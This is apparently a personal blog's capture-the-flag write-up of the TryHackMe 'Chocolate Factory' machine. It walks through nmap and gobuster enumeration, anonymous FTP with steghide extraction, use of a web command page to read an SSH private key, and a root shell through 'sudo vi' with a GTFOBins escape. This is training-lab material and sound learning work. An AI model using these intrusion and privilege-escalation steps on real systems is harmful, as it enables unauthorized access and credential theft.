---
layout: default
title: TryHackMe Chocolate Factory WriteUp
date: 2024-02-28 17:00:00 +0300
categories: [writeups]
tag: [thm,boxes]
---

# TryHackMe Chocolate Factory WriteUp

## **Reconnaissance and Enumeration**

#### first we scan the machine using nmap using the command: nmap -sV [IP HERE]

#### **nmap scan:**

```bash
21/tcp  open  ftp        vsftpd 3.0.3

22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))

100/tcp open  newacct?

106/tcp open  pop3pw?

109/tcp open  pop2?

110/tcp open  pop3?

111/tcp open  rpcbind?

113/tcp open  ident?

119/tcp open  nntp?

125/tcp open  locus-map?
```

#### **ftp enumeration:**
#### we login to ftp using username: "anonymous" and password: "anonymous"

#### in ftp found "gum_room.jpg"

#### used steghide to extract it: "steghide extract -sf gum_room.jpg"

#### didnt put passphrase, b64.txt extracterd.

#### found what looks like a /etc/shadow file. didnt find anything usefull.

#### **web enumeration:**

#### we open the webpage and find a login portal.

#### i used gobuster to enumrate directories.

```bash
"gobuster dir -u http://[IP HERE] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html"

gobuster: the name of the tool.
 
dir: specify we want to bruteforce directiories.

-u: specify the url

-w: specify the world list

-x: look for filees with exstinsions.
```
#### **result:**

```bash
/.php                 (Status: 403) [Size: 278]

/.html                (Status: 403) [Size: 278]

/index.html           (Status: 200) [Size: 1466]

/home.php             (Status: 200) [Size: 569]

/validate.php         (Status: 200) [Size: 93]
```
--------------------------
## **Initial Access:**

#### we navigat to home.php, you can run commands in it.

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/31328d5d-7b3c-4da8-9d8b-fd4475152840)

#### we try the whoami command

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/8cf2685a-7078-42d9-9941-39b071417adb)

#### it works!
#### we search for users in the home directory using “ls /home"

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/96d7bf6b-4f29-4aef-97c2-fd7cfe113a57)

#### found user charlie, we list the files, using "ls /home/charlie"

 ![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/3c453544-953a-44d1-b065-04195b075d5a)

```bash
"cat /home/charlie/teleport"
```
#### Bingo! found ssh private key.

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/82535ef1-a991-4952-89a4-b67110ab22bb)

#### i copied it into id_rsa file then give it the right permissions using `chmod +600`
#### test if we can login using ssh to the user.
#### the credintials works!

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/9522c208-f459-47b1-ae7f-8c4100d71e28)

#### in /var/www/html i found a file named key_rev_key, i try to run it:

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/0297133e-a4ca-474e-9666-f5e0b726651c)

#### changed the permissions using `chmod +x key_rev_key`

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/b2901f69-3384-42a9-bada-0c384fbf021e)

#### since its a binary, we can check the file contents using `strings key_rev_key`

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/34ce26e8-bcc5-4d97-b07f-0afe6d27704d)

#### got the key! 
`b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`

#### in /var/www/html we `cat` validate.php: 

![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/2199617c-b703-453a-aaad-aba2359fb1cd)

#### run validate.php , bingo we got charlies password :)

#### login to charlies account using "su charlie".
#### user.txt:
![image](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/afefcc59-1a50-41a5-b35c-11c2ad7a984d)

------------
## **Privilege Escalation:**

#### The first thing you should check for is `sudo -l`,
#### result:

```bash 
Matching Defaults entries for charlie on chocolate-factory:
   env_reset, mail_badpass,
   
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    
   (ALL : !root) NOPASSWD: /usr/bin/vi
```


#### in gtfobins, `vi -c ':!/bin/sh' /dev/null`

#### i ran it with sudo so if it works we could get root privileges `sudo vi -c ':!/bin/sh' /dev/null`

```bash
charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
```

#### pwned!!
-----
## **Finding the root flag:**

#### we find root.py
#### we run it , enter the key we obtained before , and it shows us the root flag.

![image(1)](https://github.com/3bodeS/TryHackMe-Chocolate-Factory-WriteUp/assets/62934084/cabbb2fe-8af8-46ec-a323-7764c1441762)

#### Happy Pwning :)
